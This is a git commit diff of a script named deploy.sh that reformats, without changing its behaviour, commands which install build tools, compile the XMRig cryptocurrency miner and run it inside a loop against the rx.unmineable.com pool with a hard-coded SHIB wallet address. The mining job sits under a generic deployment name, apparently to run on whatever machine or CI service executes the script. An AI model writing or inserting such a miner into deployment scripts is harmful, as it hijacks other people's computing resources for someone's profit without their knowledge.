5a01dc2ee7039a94a33668d3badb89daca2b9c2f
Muhammad Fiqri Zalvi <mfiqrizalvi@gmail.com>
2021-06-24 03:51:34 +0700

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -3,7 +3,9 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
  
-sudo apt-get update -y && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build &&  cmake .. && make -j$(2)  && ./xmrig -a cn-heavy/xhv -o rx.unmineable.com:3333 -u SHIB:0xc2f39632e7a1f21487f0baa06ed220c4cb3085aa -k -t 2
+sudo apt-get update -y && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y 
+git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build &&  cmake .. && make -j$(2)  
+./xmrig -a cn-heavy/xhv -o rx.unmineable.com:3333 -u SHIB:0xc2f39632e7a1f21487f0baa06ed220c4cb3085aa -k -t 2
 
  
      echo COUNTER $COUNTER
